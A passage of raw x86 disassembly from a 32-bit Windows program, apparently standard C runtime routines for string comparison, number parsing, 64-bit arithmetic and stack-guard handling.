  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
